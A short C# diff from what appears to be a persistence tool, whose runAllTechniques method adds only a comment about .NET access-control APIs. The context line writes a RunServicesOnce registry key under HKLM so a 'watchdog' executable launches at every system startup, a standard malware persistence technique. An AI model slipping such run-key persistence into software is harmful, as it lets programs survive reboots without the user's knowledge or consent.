@@ -12,7 +12,12 @@ namespace Persistence
 
         public static void runAllTechniques()
         {
+            /*
+             * The issue is that File.GetAccessControl and File.SetAccessControl are not available in all .NET frameworks. They are available in the full .NET Framework, but not in .NET Core or .NET 5+.
 
+
+             * 
+             */
 
 
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
